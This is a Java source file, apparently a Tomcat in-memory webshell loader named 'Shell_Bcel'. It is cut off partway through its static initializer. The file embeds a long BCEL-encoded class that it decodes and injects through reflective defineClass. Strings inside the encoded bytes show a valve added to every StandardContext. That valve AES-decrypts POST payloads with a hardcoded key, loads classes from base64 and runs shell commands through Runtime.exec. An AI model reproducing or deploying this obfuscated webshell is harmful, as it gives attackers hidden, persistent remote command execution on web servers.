import java.lang.reflect.Method;
public class Shell_Bcel {
    static {
        String str = "$ca$fe$ba$be$A$A$A4$B$l$K$A$U$A$80$H$A$81$K$A$C$A$80$J$AY$A$82$J$AY$A$83$K$AY$A$84$K$AY$A$85$I$A$86$K$A$87$A$88$K$A$87$A$89$K$A$8a$A$8b$I$A$8c$K$A$8d$A$8e$I$A$8f$H$A$90$H$A$91$J$A$92$A$93$K$A$P$A$94$K$A$95$A$96$H$A$97$K$A$92$A$98$K$A$95$A$99$K$A$P$A$9a$H$A$9b$K$A$Y$A$9c$K$A$C$A$9d$L$A$9e$A$9f$L$A$9e$A$a0$H$A$a1$H$A$a2$K$A$j$A$a3$K$A$U$A$a4$K$A$P$A$a5$K$A$a6$A$96$K$A$a6$A$a7$H$A$a8$H$A$a9$K$A$P$A$aa$K$A$87$A$ab$I$A$ac$K$AY$A$ad$H$A$ae$K$A$87$A$af$I$A$b0$K$A$3a$A$b1$I$A$b2$H$A$b3$I$A$b4$I$A$b5$I$A$b6$I$A$b7$I$A$b8$I$A$b9$K$A$U$A$ba$I$A$bb$H$A$bc$I$A$bd$H$A$be$J$AY$A$bf$K$A8$A$c0$K$A8$A$c1$I$A$c2$J$AY$A$c3$K$AY$A$c4$I$A$c5$I$A$c6$I$A$c7$I$A$c8$I$A$c9$I$A$ca$I$A$cb$I$A$cc$H$A$cd$I$A$ce$I$A$cf$H$A$d0$K$AL$A$d1$L$A$d2$A$9d$H$A$d4$L$AO$A$d7$H$A$d8$K$AL$A$d9$K$A$3a$A$da$K$AL$A$a7$K$A$C$A$db$K$A$C$A$dc$K$A$C$A$dd$K$A$C$A$de$H$A$df$B$A$Duri$B$A$SLjava$_lang$_String$3b$B$A$KserverName$B$A$QstandardContext_$B$A$VLjava$_util$_ArrayList$3b$B$A$JSignature$B$AALjava$_util$_ArrayList$3cLorg$_apache$_catalina$_core$_StandardContext$3b$3e$3b$B$A$RstandardContext__$B$A$G$3cinit$3e$B$A$D$u$vV$B$A$ECode$B$A$PLineNumberTable$B$A$NStackMapTable$H$A$df$H$A$81$H$A$be$H$A$97$H$A$9b$H$A$e0$H$A$a1$B$A$IgetField$B$A8$uLjava$_lang$_Object$3bLjava$_lang$_String$3b$vLjava$_lang$_Object$3b$H$A$90$H$A$a8$H$A$a9$B$A$JgetThread$H$A$e1$H$A$bc$B$A$SgetStandardContext$H$A$cd$H$A$d0$H$A$d8$H$A$d4$B$A$GgetSTC$B$A$X$u$vLjava$_util$_ArrayList$3b$B$AC$u$vLjava$_util$_ArrayList$3cLorg$_apache$_catalina$_core$_StandardContext$3b$3e$3b$B$A$KSourceFile$B$A$NaddValve$$java$M$Ab$Ac$B$A$Tjava$_util$_ArrayList$M$A$5d$A$5e$M$Aa$A$5e$M$As$Ac$M$A$7b$A$7c$B$V$eb$qca$qfe$qba$qbe$qA$qA$qA4$qA$qee$qK$qA$q40$qAT$qI$qAU$qK$qAV$qAW$qI$qAX$qK$qA$q3b$qAY$qK$qAV$qAZ$qI$qA$q5b$qI$qA$q5c$qK$qAV$qA$q5d$qI$qA$q5e$qL$qA_$qA$q60$qI$qAa$qK$qAb$qAc$qH$qAd$qK$qA$q3b$qAe$qK$qA$qO$qAf$qK$qAb$qAg$qH$qAh$qK$qA$qS$qAT$qI$qAi$qK$qA$qS$qAj$qI$qAk$qI$qAl$qK$qAm$qAn$qK$qAm$qAo$qI$qAp$qK$qAq$qAr$qI$qAs$qH$qAt$qH$qAu$qJ$qAv$qAw$qK$qA$qj$qAx$qK$qAy$qAz$qH$qA$q7b$qK$qA$qo$qAT$qK$qAV$qA$q7c$qK$qA$q7d$qA$q7e$qK$qA$qo$qA$q7f$qK$qAb$qA$q80$qH$qA$q81$qK$qAv$qA$q82$qK$qAy$qA$q83$qK$qA$qj$qA$q84$qK$qA$qu$qAY$qH$qA$q85$qK$qA$q3f$qA$q86$qL$qA$q87$qA$q88$qK$qA$q89$qA$q8a$qK$qA$q3b$qA$q8b$qI$qA$q8c$qK$qA$q3b$qA$q8d$qK$qA$q89$qA$q8e$qK$qA$q8f$qA$q90$qH$qA$q91$qK$qA6$qAT$qK$qA$q92$qA$q93$qK$qA6$qA$q94$qK$qA$q95$qA$q96$qH$qA$q97$qK$qA6$qA$q98$qK$qA$q3b$qA$q99$qK$qA$q9a$qA$q9b$qH$qA$q9c$qH$qA$q9d$qB$qA$qG$q3cinit$q3e$qB$qA$qD$qu$qvV$qB$qA$qECode$qB$qA$qPLineNumberTable$qB$qA$qGinvoke$qB$qAR$quLorg$q_apache$q_catalina$q_connector$q_Request$q3bLorg$q_apache$q_catalina$q_connector$q_Response$q3b$qvV$qB$qA$qNStackMapTable$qH$qA$q9c$qH$qA$q9e$qH$qA$q9f$qH$qA$q97$qH$qA$q85$qH$qA$qa0$qH$qA$q91$qB$qA$qKExceptions$qH$qA$qa1$qH$qA$qa2$qB$qA$qKSourceFile$qB$qA$qOValveimpl$q$qjava$qM$qAA$qAB$qB$qA$qG_iflag$qH$qA$q9e$qM$qA$qa3$qA$qa4$qB$qA$qA$qM$qA$qa5$qA$qa6$qM$qA$qa7$qA$qa8$qB$qA$qEPOST$qB$qA$qQ53c1d8ec2639f01b$qM$qA$qa9$qA$qaa$qB$qA$qBu$qH$qA$qab$qM$qA$qac$qA$qad$qB$qA$qDAES$qH$qA$qae$qM$qA$qaf$qA$qb0$qB$qA$qljavax$q_crypto$q_spec$q_SecretKeySpec$qM$qA$qb1$qA$qb2$qM$qAA$qA$qb3$qM$qA$qb4$qA$qb5$qB$qA$qRjava$q_util$q_HashMap$qB$qA$qHrequest$qM$qA$qb6$qA$qb7$qB$qA$qIresponse$qB$qA$qHsession$qH$qA$qb8$qM$qA$qb9$qA$qba$qM$qA$qbb$qA$qbc$qB$qA$qVjava$q$qlang$q$qClassLoader$qH$qA$qbd$qM$qA$qbe$qA$qbf$qB$qA$qLdefineClass$qB$qA$qPjava$q_lang$q_Class$qB$qA$qC$q5bB$qH$qA$qc0$qM$qA$qc1$qA$qc2$qM$qA$qc3$qA$qc4$qH$qA$qc5$qM$qA$qc6$qA$qc7$qB$qA$qWsun$q_misc$q_BASE64Decoder$qM$qA$qc8$qA$qc9$qH$qA$qca$qM$qA$qcb$qA$qa8$qM$qA$qcc$qA$qcd$qM$qA$qce$qA$qcf$qB$qA$qQjava$q_lang$q_Object$qM$qA$qd0$qA$qd1$qM$qAE$qA$qd2$qM$qA$qd3$qA$qd4$qB$qA$qTjava$q_lang$q_Exception$qM$qA$qd5$qA$qd6$qH$qA$qd7$qM$qAE$qAF$qH$qA$qd8$qM$qA$qd9$qA$qda$qM$qA$qdb$qA$qa8$qB$qA$qB$qm$qM$qA$qdc$qA$qdd$qM$qA$qde$qA$qdf$qH$qA$qe0$qM$qA$qe1$qA$qe2$qB$qA$qjjava$q_io$q_ByteArrayOutputStream$qH$qA$qa0$qM$qA$qe3$qA$qe4$qM$qA$qe5$qA$qe6$qH$qA$q9f$qM$qA$qe7$qA$qe8$qB$qA$qQjava$q_lang$q_String$qM$qA$qe9$qA$qb2$qM$qAA$qA$qea$qH$qA$qeb$qM$qA$qec$qA$qed$qB$qA$qJValveimpl$qB$qA$qqorg$q_apache$q_catalina$q_valves$q_ValveBase$qB$qA$qrorg$q_apache$q_catalina$q_connector$q_Request$qB$qA$qsorg$q_apache$q_catalina$q_connector$q_Response$qB$qA$qTjava$q_io$q_InputStream$qB$qA$qTjava$q_io$q_IOException$qB$qA$qkjavax$q_servlet$q_ServletException$qB$qA$qMgetParameter$qB$qA$qs$quLjava$q_lang$q_String$q3b$qvLjava$q_lang$q_String$q3b$qB$qA$qGequals$qB$qA$qV$quLjava$q_lang$q_Object$q3b$qvZ$qB$qA$qJgetMethod$qB$qA$qU$qu$qvLjava$q_lang$q_String$q3b$qB$qA$qKgetSession$qB$qA$qo$qu$qvLjavax$q_servlet$q_http$q_HttpSession$q3b$qB$qA$qkjavax$q_servlet$q_http$q_HttpSession$qB$qA$qIputValue$qB$qA$qt$quLjava$q_lang$q_String$q3bLjava$q_lang$q_Object$q3b$qvV$qB$qA$qTjavax$q_crypto$q_Cipher$qB$qA$qLgetInstance$qB$qA$qv$quLjava$q_lang$q_String$q3b$qvLjavax$q_crypto$q_Cipher$q3b$qB$qA$qIgetBytes$qB$qA$qE$qu$qv$q5bB$qB$qA$qX$qu$q5bBLjava$q_lang$q_String$q3b$qvV$qB$qA$qEinit$qB$qA$qX$quILjava$q_security$q_Key$q3b$qvV$qB$qA$qDput$qB$qA8$quLjava$q_lang$q_Object$q3bLjava$q_lang$q_Object$q3b$qvLjava$q_lang$q_Object$q3b$qB$qA$qQjava$q_lang$q_Thread$qB$qA$qNcurrentThread$qB$qA$qU$qu$qvLjava$q_lang$q_Thread$q3b$qB$qA$qVgetContextClassLoader$qB$qA$qZ$qu$qvLjava$q_lang$q_ClassLoader$q3b$qB$qA$qVjava$q_lang$q_ClassLoader$qB$qA$qJloadClass$qB$qA$qr$quLjava$q_lang$q_String$q3b$qvLjava$q_lang$q_Class$q3b$qB$qA$qRjava$q_lang$q_Integer$qB$qA$qETYPE$qB$qA$qRLjava$q_lang$q_Class$q3b$qB$qA$qRgetDeclaredMethod$qB$qA$q40$quLjava$q_lang$q_String$q3b$q5bLjava$q_lang$q_Class$q3b$qvLjava$q_lang$q_reflect$q_Method$q3b$qB$qA$qYjava$q_lang$q_reflect$q_Method$qB$qA$qNsetAccessible$qB$qA$qE$quZ$qvV$qB$qA$qJgetReader$qB$qA$qg$qu$qvLjava$q_io$q_BufferedReader$q3b$qB$qA$qWjava$q_io$q_BufferedReader$qB$qA$qIreadLine$qB$qA$qMdecodeBuffer$qB$qA$qW$quLjava$q_lang$q_String$q3b$qv$q5bB$qB$qA$qHdoFinal$qB$qA$qG$qu$q5bB$qv$q5bB$qB$qA$qHvalueOf$qB$qA$qW$quI$qvLjava$q_lang$q_Integer$q3b$qB$qA9$quLjava$q_lang$q_Object$q3b$q5bLjava$q_lang$q_Object$q3b$qvLjava$q_lang$q_Object$q3b$qB$qA$qLnewInstance$qB$qA$qU$qu$qvLjava$q_lang$q_Object$q3b$qB$qA$qHgetNext$qB$qA$qj$qu$qvLorg$q_apache$q_catalina$q_Valve$q3b$qB$qA$qZorg$q_apache$q_catalina$q_Valve$qB$qA$qRjava$q_lang$q_Runtime$qB$qA$qKgetRuntime$qB$qA$qV$qu$qvLjava$q_lang$q_Runtime$q3b$qB$qA$qEtrim$qB$qA$qFsplit$qB$qA$qt$quLjava$q_lang$q_String$q3b$qv$q5bLjava$q_lang$q_String$q3b$qB$qA$qEexec$qB$qA$qu$qu$q5bLjava$q_lang$q_String$q3b$qvLjava$q_lang$q_Process$q3b$qB$qA$qRjava$q_lang$q_Process$qB$qA$qOgetInputStream$qB$qA$qX$qu$qvLjava$q_io$q_InputStream$q3b$qB$qA$qEread$qB$qA$qF$qu$q5bB$qvI$qB$qA$qFwrite$qB$qA$qH$qu$q5bBII$qvV$qB$qA$qJgetWriter$qB$qA$qX$qu$qvLjava$q_io$q_PrintWriter$q3b$qB$qA$qLtoByteArray$qB$qA$qF$qu$q5bB$qvV$qB$qA$qTjava$q_io$q_PrintWriter$qB$qA$qHprintln$qB$qA$qV$quLjava$q_lang$q_String$q3b$qvV$qA$qn$qA$q3f$qA$q40$qA$qA$qA$qA$qA$qC$qA$qB$qAA$qAB$qA$qB$qAC$qA$qA$qA$qn$qA$qB$qA$qB$qA$qA$qA$qF$qw$qb7$qA$qB$qb1$qA$qA$qA$qB$qAD$qA$qA$qA$qK$qA$qC$qA$qA$qA$qR$qA$qE$qA$qS$qA$qB$qAE$qAF$qA$qC$qAC$qA$qA$qC$q84$qA$qG$qA$qN$qA$qA$qBx$qx$qS$qC$qb6$qA$qDN$qz$qc6$qBU$qz$qS$qE$qb6$qA$qF$q9a$qBL$qx$qb6$qA$qG$qS$qH$qb6$qA$qF$q99$qA$qe8$qS$qI$q3a$qE$qx$qb6$qA$qJ$q3a$qF$qZ$qF$qS$qK$qZ$qE$qb9$qA$qL$qD$qA$qS$qM$qb8$qA$qN$q3a$qG$qZ$qG$qF$qbb$qA$qOY$qZ$qE$qb6$qA$qP$qS$qM$qb7$qA$qQ$qb6$qA$qR$qbb$qA$qSY$qb7$qA$qT$q3a$qH$qZ$qH$qS$qU$qx$qb6$qA$qVW$qZ$qH$qS$qW$qy$qb6$qA$qVW$qZ$qH$qS$qX$qZ$qF$qb6$qA$qVW$qb8$qA$qY$qb6$qA$qZ$q3a$qI$qZ$qI$qS$qg$qb6$qA$qh$q3a$qJ$qZ$qJ$qS$qi$qG$qbd$qA$qjY$qD$qS$qkSY$qE$qb2$qA$qlSY$qF$qb2$qA$qlS$qb6$qA$qm$q3a$qK$qZ$qK$qE$qb6$qA$qn$qZ$qG$qbb$qA$qoY$qb7$qA$qp$qx$qb6$qA$qq$qb6$qA$qr$qb6$qA$qs$qb6$qA$qt$q3a$qL$qZ$qK$qZ$qI$qG$qbd$qA$quY$qD$qZ$qLSY$qE$qD$qb8$qA$qvSY$qF$qZ$qL$qbe$qb8$qA$qvS$qb6$qA$qw$qc0$qA$qj$q3a$qM$qZ$qM$qb6$qA$qx$qZ$qH$qb6$qA$qyW$qa7$qAv$q3a$qE$qw$qb6$qA$q$q$qx$qy$qb9$qA$q_$qD$qA$qa7$qAf$qb8$qA0$qz$qb6$qA1$qS2$qb6$qA3$qb6$qA4$qb6$qA5$q3a$qE$qbb$qA6Y$qb7$qA7$q3a$qF$qR$qE$qA$qbc$qI$q3a$qG$qC6$qH$qZ$qE$qZ$qG$qb6$qA8Y6$qH$qC$q9f$qA$qQ$qZ$qF$qZ$qG$qD$qV$qH$qb6$qA9$qa7$qff$qe8$qy$qb6$qA$q3a$qbb$qA$q3bY$qZ$qF$qb6$qA$q3c$qb7$qA$q3d$qb6$qA$q3e$qa7$qA$qO$qw$qb6$qA$q$q$qx$qy$qb9$qA$q_$qD$qA$qa7$qA$qPN$qw$qb6$qA$q$q$qx$qy$qb9$qA$q_$qD$qA$qb1$qA$qC$qA$qm$qA$qf2$qA$qf5$qA$qz$qA$qA$qBh$qBk$qA$qz$qA$qC$qAD$qA$qA$qA$q92$qA$qq$qA$qA$qA$qX$qA$qH$qA$qY$qA$qU$qA$qZ$qA$qm$qA$qh$qA$qq$qA$qi$qA$qw$qA$qj$qA5$qA$qk$qA$q3c$qA$ql$qAP$qA$qm$qAY$qA$qn$qAb$qA$qo$qAk$qA$qp$qAu$qA$qq$qA$q7d$qA$qr$qA$q86$qA$qs$qA$qa4$qA$qt$qA$qaa$qA$qu$qA$qc2$qA$qv$qA$qe7$qA$qw$qA$qf2$qA$qz$qA$qf5$qA$qx$qA$qf7$qA$qy$qB$qC$qA$qz$qB$qF$qA$q_$qB$qZ$qA0$qB$qo$qA1$qB$qv$qA2$qB$qy$qA3$qB$q3a$qA4$qBG$qA6$qBZ$qA7$qB$q5d$qA9$qBh$qA$q3d$qBk$qA$q3b$qBl$qA$q3c$qBw$qA$q3e$qAG$qA$qA$qAR$qA$qI$qff$qA$qf5$qA$qE$qH$qAH$qH$qAI$qH$qAJ$qH$qAK$qA$qB$qH$qAL$qP$qff$qA$qs$qA$qI$qH$qAH$qH$qAI$qH$qAJ$qH$qAK$qH$qAM$qH$qAN$qH$qA$qk$qB$qA$qA$qg$qff$qA$qV$qA$qE$qH$qAH$qH$qAI$qH$qAJ$qH$qAK$qA$qA$qfa$qA$qKB$qH$qAL$qL$qAO$qA$qA$qA$qG$qA$qC$qAP$qAQ$qA$qB$qAR$qA$qA$qA$qC$qAS$H$A$e1$M$A$e2$A$e3$M$A$e4$A$e5$H$A$e6$M$A$e7$A$e8$B$A$Vjava$$lang$$ClassLoader$H$A$e9$M$A$ea$A$eb$B$A$LdefineClass$B$A$Pjava$_lang$_Class$B$A$C$5bB$H$A$ec$M$A$ed$A$ee$M$A$ef$A$f0$H$A$f1$M$A$f2$A$f3$B$A$Qjava$_lang$_Object$M$A$f4$A$f5$M$A$f6$A$f7$M$A$f8$A$f9$B$A$Tjava$_lang$_Exception$M$A$fa$Ac$M$A$fb$A$fc$H$A$e0$M$A$fd$A$fe$M$A$ff$A$f9$B$A$uorg$_apache$_catalina$_core$_StandardContext$B$A$Zorg$_apache$_catalina$_Valve$M$A$df$B$A$M$B$B$B$C$M$B$D$B$E$H$B$F$M$B$G$B$H$B$A$kjava$_lang$_NoSuchFieldException$B$A$mjava$_lang$_IllegalAccessException$M$B$I$B$C$M$B$J$B$K$B$A$Hthreads$M$An$Ao$B$A$T$5bLjava$_lang$_Thread$3b$M$B$L$B$M$B$A$Eexec$M$B$N$B$O$B$A$Gtarget$B$A$Sjava$_lang$_Runnable$B$A$Gthis$q0$B$A$Hhandler$B$A$Gglobal$B$A$Kprocessors$B$A$Dreq$B$A$KserverPort$M$B$P$B$Q$B$A$MserverNameMB$B$A$torg$_apache$_tomcat$_util$_buf$_MessageBytes$B$A$IstrValue$B$A$Qjava$_lang$_String$M$A$5c$A$5b$M$B$R$B$M$M$B$S$B$M$B$A$FuriMB$M$AZ$A$5b$M$Av$Ac$B$A$IAcceptor$B$A$Ehttp$B$A$Iendpoint$B$A$Fproto$B$A$Hadapter$B$A$Jconnector$B$A$Hservice$B$A$Jcontainer$B$A$torg$_apache$_catalina$_core$_StandardEngine$B$A$Gengine$B$A$Ichildren$B$A$Rjava$_util$_HashMap$M$B$T$B$U$H$B$V$H$B$W$B$A$Tjava$_util$_Map$qEntry$B$A$FEntry$B$A$MInnerClasses$M$B$X$A$f9$B$A$rorg$_apache$_catalina$_core$_StandardHost$M$B$Y$B$U$M$B$Z$B$g$M$B$h$B$Q$M$B$i$B$j$M$B$G$B$k$M$B$N$B$Q$B$A$IaddValve$B$A$Sjava$_util$_Iterator$B$A$Qjava$_lang$_Thread$B$A$NcurrentThread$B$A$U$u$vLjava$_lang$_Thread$3b$B$A$VgetContextClassLoader$B$A$Z$u$vLjava$_lang$_ClassLoader$3b$B$A2com$_sun$_org$_apache$_bcel$_internal$_classfile$_Utility$B$A$Gdecode$B$A$X$uLjava$_lang$_String$3bZ$v$5bB$B$A$Vjava$_lang$_ClassLoader$B$A$JloadClass$B$A$r$uLjava$_lang$_String$3b$vLjava$_lang$_Class$3b$B$A$Rjava$_lang$_Integer$B$A$ETYPE$B$A$RLjava$_lang$_Class$3b$B$A$RgetDeclaredMethod$B$A$40$uLjava$_lang$_String$3b$5bLjava$_lang$_Class$3b$vLjava$_lang$_reflect$_Method$3b$B$A$Yjava$_lang$_reflect$_Method$B$A$NsetAccessible$B$A$E$uZ$vV$B$A$HvalueOf$B$A$W$uI$vLjava$_lang$_Integer$3b$B$A$Ginvoke$B$A9$uLjava$_lang$_Object$3b$5bLjava$_lang$_Object$3b$vLjava$_lang$_Object$3b$B$A$LnewInstance$B$A$U$u$vLjava$_lang$_Object$3b$B$A$PprintStackTrace$B$A$Iiterator$B$A$W$u$vLjava$_util$_Iterator$3b$B$A$HhasNext$B$A$D$u$vZ$B$A$Enext$B$A$k$uLorg$_apache$_catalina$_Valve$3b$vV$B$A$IgetClass$B$A$T$u$vLjava$_lang$_Class$3b$B$A$QgetDeclaredField$B$A$z$uLjava$_lang$_String$3b$vLjava$_lang$_reflect$_Field$3b$B$A$Xjava$_lang$_reflect$_Field$B$A$Dget$B$A$s$uLjava$_lang$_Object$3b$vLjava$_lang$_Object$3b$B$A$NgetSuperclass$B$A$OgetThreadGroup$B$A$Z$u$vLjava$_lang$_ThreadGroup$3b$B$A$HgetName$B$A$U$u$vLjava$_lang$_String$3b$B$A$Icontains$B$A$h$uLjava$_lang$_CharSequence$3b$vZ$B$A$Gequals$B$A$V$uLjava$_lang$_Object$3b$vZ$B$A$ItoString$B$A$JgetString$B$A$IentrySet$B$A$R$u$vLjava$_util$_Set$3b$B$A$Njava$_util$_Set$B$A$Njava$_util$_Map$B$A$IgetValue$B$A$GkeySet$B$A$KstartsWith$B$A$V$uLjava$_lang$_String$3b$vZ$B$A$Dadd$B$A$Esize$B$A$D$u$vI$B$A$V$uI$vLjava$_lang$_Object$3b$A$n$AY$A$U$A$A$A$E$A$C$AZ$A$5b$A$A$A$C$A$5c$A$5b$A$A$A$C$A$5d$A$5e$A$B$A_$A$A$A$C$A$60$A$C$Aa$A$5e$A$B$A_$A$A$A$C$A$60$A$F$A$B$Ab$Ac$A$B$Ad$A$A$B$81$A$G$A$I$A$A$A$c6$w$b7$A$B$w$bb$A$CY$b7$A$D$b5$A$E$w$bb$A$CY$b7$A$D$b5$A$F$w$b6$A$G$w$b6$A$HL$S$IM$BN$b8$A$J$b6$A$K$3a$E$y$D$b8$A$L$3a$F$Z$E$S$M$b6$A$N$3a$G$Z$G$S$O$G$bd$A$PY$D$S$QSY$E$b2$A$RSY$F$b2$A$RS$b6$A$S$3a$H$Z$H$E$b6$A$T$Z$H$Z$E$G$bd$A$UY$D$Z$FSY$E$D$b8$A$VSY$F$Z$F$be$b8$A$VS$b6$A$W$c0$A$P$b6$A$XN$a7$A$K$3a$E$Z$E$b6$A$Z$x$b6$A$g$3a$E$Z$E$b9$A$h$B$A$99$A$p$Z$E$b9$A$i$B$A$c0$A$j$3a$F$Z$F$z$c0$A$k$b6$A$l$a7$A$I$3a$G$a7$ff$dc$a7$ff$d9$b1$A$C$A$u$A$8b$A$8e$A$Y$A$b1$A$ba$A$bd$A$Y$A$C$Ae$A$A$AR$A$U$A$A$A$S$A$E$A$O$A$P$A$P$A$g$A$T$A$k$A$U$A$p$A$V$A$s$A$W$A$u$A$Y$A0$A$Z$A7$A$g$A$40$A$h$A$5e$A$i$Ad$A$j$A$8b$A$m$A$8e$A$k$A$90$A$l$A$95$A$n$A$b1$A$o$A$c2$A$p$A$c5$A$q$Af$A$A$AA$A$G$ff$A$8e$A$E$H$Ag$H$Ah$H$Ai$H$Aj$A$B$H$Ak$G$fc$A$F$H$Al$ff$A$n$A$G$H$Ag$H$Ah$H$Ai$H$Aj$H$Al$H$Am$A$B$H$Ak$fa$A$E$fa$A$C$A$B$An$Ao$A$B$Ad$A$A$A$97$A$C$A$G$A$A$A2$x$b6$A$m$3a$E$Z$E$S$U$a5$A$s$Z$E$y$b6$A$nN$z$E$b6$A$o$z$x$b6$A$p$b0$3a$F$a7$A$F$3a$F$Z$E$b6$A$s$3a$E$a7$ff$d9$B$b0$A$C$A$N$A$k$A$l$A$q$A$N$A$k$A$q$A$r$A$C$Ae$A$A$A$w$A$K$A$A$A$u$A$G$A$v$A$N$A$y$A$U$A$z$A$Z$A$$$A$l$A$_$A$n$A1$A$q$A0$A$s$A2$A0$A4$Af$A$A$A$T$A$F$fd$A$G$A$H$ApX$H$AqD$H$Ar$B$J$A$B$As$Ac$A$B$Ad$A$A$C$8a$A$F$A$P$A$A$BG$w$b8$A$J$b6$A$t$S$u$b6$A$v$c0$A$w$c0$A$wL$xN$z$be6$E$D6$F$V$F$V$E$a2$B$s$z$V$F2$3a$G$Z$G$c7$A$G$a7$B$S$Z$G$b6$A$x$S$y$b6$A$z$99$A$G$a7$B$C$w$Z$G$S$$$b6$A$v$3a$H$Z$H$c1$A$_$9a$A$G$a7$A$ed$w$w$w$Z$H$S0$b6$A$v$S1$b6$A$v$S2$b6$A$vM$a7$A$I$3a$I$a7$A$d0$y$c7$A$G$a7$A$c9$w$y$S3$b6$A$v$c0$A$C$3a$I$Z$I$b6$A$g$3a$J$Z$J$b9$A$h$B$A$99$A$ac$Z$J$b9$A$i$B$A$3a$K$w$Z$K$S4$b6$A$v$3a$L$w$Z$L$S5$b6$A$v$3a$M$Z$M$C$b8$A$V$b6$A6$99$A$G$a7$ff$cd$w$Z$L$S7$b6$A$v$c0$A8$3a$N$w$w$Z$N$S9$b6$A$v$c0$A$3a$b5$A$3b$w$b4$A$3b$c7$A$M$w$Z$N$b6$A$3c$b5$A$3b$w$b4$A$3b$c7$A$M$w$Z$N$b6$A$3d$b5$A$3b$w$Z$L$S$3e$b6$A$v$c0$A8$3a$O$w$w$Z$O$S9$b6$A$v$c0$A$3a$b5$A$3f$w$b4$A$3f$c7$A$M$w$Z$O$b6$A$3c$b5$A$3f$w$b4$A$3f$c7$A$M$w$Z$O$b6$A$3d$b5$A$3f$w$b6$A$40$b1$84$F$B$a7$fe$d9$b1$A$B$AV$Ak$An$A$Y$A$C$Ae$A$A$A$9e$A$t$A$A$A8$A$T$A$3a$A$v$A$3b$A$$$A$3c$A1$A$3e$A$3e$A$3f$AA$AA$AK$AB$AS$AC$AV$AG$Ak$AJ$An$AH$Ap$AI$As$AK$Aw$AL$Az$AN$A$86$AO$A$8d$AP$A$97$AQ$A$a0$AS$A$aa$AT$A$b4$AU$A$c0$AV$A$c3$AX$A$d0$AY$A$df$AZ$A$e6$A$5b$A$ef$A$5d$A$f6$A$5e$A$ff$Aa$B$M$Ab$B$h$Ac$B$o$Ad$B$x$Af$B2$Ag$B$3b$Aj$B$3f$Ak$B$40$A$3a$BF$An$Af$A$A$A$85$A$P$ff$A$i$A$G$H$Ag$H$A$w$A$H$A$w$B$B$A$A$fc$A$U$H$At$P$fc$A$U$H$AjW$H$Ak$ff$A$E$A$I$H$Ag$H$A$w$H$Aj$H$A$w$B$B$H$At$H$Aj$A$A$G$fd$A$S$H$Ah$H$Al$fe$A5$H$Aj$H$Aj$H$Aj$fc$A$x$H$Au$P$fc$A$x$H$Au$P$ff$A$E$A$G$H$Ag$H$A$w$A$H$A$w$B$B$A$A$ff$A$F$A$C$H$Ag$H$A$w$A$A$A$B$Av$Ac$A$B$Ad$A$A$C$eb$A$H$A$R$A$A$Bb$w$b8$A$J$b6$A$t$S$u$b6$A$v$c0$A$w$c0$A$wL$xM$y$be$3e$D6$E$V$E$j$a2$BC$y$V$E2$3a$F$Z$F$c7$A$G$a7$B$_$Z$F$b6$A$x$SA$b6$A$z$99$B$o$Z$F$b6$A$x$SB$b6$A$z$99$B$V$w$Z$F$S$$$b6$A$v$3a$G$B$3a$I$w$Z$G$S0$b6$A$v$3a$I$a7$A$F$3a$J$Z$I$c7$A$T$w$Z$G$SC$b6$A$v$3a$I$a7$A$G$3a$J$b1$w$w$w$w$w$Z$I$S1$b6$A$v$SD$b6$A$v$SE$b6$A$v$SF$b6$A$v$SG$b6$A$v$3a$J$B$3a$K$w$Z$J$SH$b6$A$v$c0$AI$3a$K$a7$A$F$3a$L$Z$K$c7$A$Q$w$Z$J$SJ$b6$A$v$c0$AI$3a$K$w$Z$K$SK$b6$A$v$c0$AL$3a$H$B$3a$L$Z$H$b6$AM$b9$AN$B$A$3a$M$Z$M$b9$A$h$B$A$99$Au$Z$M$b9$A$i$B$A$c0$AO$3a$N$Z$N$b9$AP$B$A$c0$AQ$3a$L$w$Z$L$SK$b6$A$v$c0$AL$3a$H$Z$H$b6$AR$b9$AN$B$A$3a$O$Z$O$b9$A$h$B$A$99$A7$Z$O$b9$A$i$B$A$c0$A$3a$3a$P$w$b4$A$3f$Z$P$b6$AS$9a$A$G$a7$ff$de$Z$H$Z$P$b6$AT$c0$A$j$3a$Q$w$b4$A$E$Z$Q$b6$AUW$a7$ff$c5$a7$ff$87$84$E$B$a7$fe$bd$b1$A$D$AV$A$60$Ac$A$Y$Aj$At$Aw$A$Y$A$9f$A$ac$A$af$A$Y$A$C$Ae$A$A$A$a2$A$u$A$A$Aq$A$T$Ar$A$t$As$A$y$At$A$_$Av$AI$Aw$AS$Ay$AV$A$7b$A$60$A$7d$Ac$A$7c$Ae$A$7e$Aj$A$80$At$A$83$Aw$A$81$Ay$A$82$Az$A$85$A$9c$A$86$A$9f$A$88$A$ac$A$8a$A$af$A$89$A$b1$A$8b$A$b6$A$8c$A$c3$A$8e$A$d0$A$90$A$d3$A$91$A$df$A$92$A$e9$A$93$A$f5$A$94$B$B$A$95$B$O$A$96$B$g$A$97$B$q$A$98$B0$A$99$B$3c$A$9a$B$3f$A$9c$BK$A$9d$BU$A$9e$BX$A$9f$B$5b$Ar$Ba$A$a2$Af$A$A$A$b7$A$P$ff$A$h$A$F$H$Ag$H$A$w$H$A$w$B$B$A$A$fc$A$T$H$At$ff$A3$A$J$H$Ag$H$A$w$H$A$w$B$B$H$At$H$Aj$A$H$Aj$A$B$H$Ak$BQ$H$Ak$C$ff$A4$A$L$H$Ag$H$A$w$H$A$w$B$B$H$At$H$Aj$A$H$Aj$H$Aj$H$Aw$A$B$H$Ak$B$R$ff$A$h$A$N$H$Ag$H$A$w$H$A$w$B$B$H$At$H$Aj$H$Ax$H$Aj$H$Aj$H$Aw$H$Ay$H$Al$A$A$fd$A$3a$H$Az$H$Al$fc$A$q$H$Ai$f8$A$Y$ff$A$C$A$F$H$Ag$H$A$w$H$A$w$B$B$A$A$f8$A$F$A$B$A$7b$A$7c$A$C$Ad$A$A$Ar$A$D$A$C$A$A$A$3a$D$3c$h$w$b4$A$E$b6$AV$a2$A$x$w$b4$A$F$w$b4$A$E$h$b6$AW$b6$AX$9a$A$T$w$b4$A$F$w$b4$A$E$h$b6$AW$b6$AUW$84$B$B$a7$ff$d0$w$b4$A$F$b0$A$A$A$C$Ae$A$A$A$W$A$F$A$A$A$a5$A$N$A$a6$A$l$A$a7$A$_$A$a5$A5$A$a9$Af$A$A$A$K$A$D$fc$A$C$B$y$fa$A$F$A_$A$A$A$C$A$7d$A$C$A$7e$A$A$A$C$A$7f$A$d6$A$A$A$K$A$B$AO$A$d3$A$d5$G$J";
        try {
            byte[] d =com.sun.org.apache.bcel.internal.classfile.Utility.decode(str,false);
            ClassLoader clzLoader = Thread.currentThread().getContextClassLoader();
            Class<?> aClass = clzLoader.loadClass("java.lang.ClassLoader");
            Method defineClass = aClass.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
